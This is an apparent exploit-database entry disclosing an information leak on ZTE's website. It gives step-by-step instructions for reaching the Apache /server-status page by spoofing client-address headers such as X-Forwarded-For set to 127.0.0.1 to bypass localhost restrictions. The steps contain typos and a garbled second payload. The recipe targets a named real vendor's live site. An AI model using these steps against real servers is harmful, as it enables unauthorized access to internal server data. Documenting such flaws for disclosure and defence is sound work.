# Exploit Title: ZTE lekage of server data
# Exploit Author: Ramansh Sharma
# Vendor Name: ZTE
# Vendor Homepage: https://www.zte.com.cn/global/
# Software Link: https://www.zte.com.cn/global/
# Tested on: Kali Linux, Apache, Firefox, Chrome


Description:Server sensitive info leaked
Its been observed that there is a misconfiguration in the website of ZTE where server data is being leaked along with sensitive information

Vulnerable Parameters:
Name url/server-status
Payload:
/server-status

Steps:
1) Locate yourself to he url
2) Now change the headers in any or all the format enlisted below
    headers:
      Forwarded: "127.0.0.1"
      X-Client-IP: "127.0.0.1"
      X-Forwarded-By: "127.0.0.1"
      X-Forwarded-For: "127.0.0.1"
      X-Forwarded-For-IP: "127.0.0.1"
      X-Forwarded-Host: "127.0.0.1"
      X-Host: "127.0.0.1"
      X-Originating-IP: "127.0.0.1"
      X-Remote-Addr: "127.0.0.1"
      X-Remote-IP: "127.0.0.1"
      X-True-IP: "127.0.0.1"
3) Now add the given location

Payload: /server-statust>

4) You will be redirected on the given location along with server information
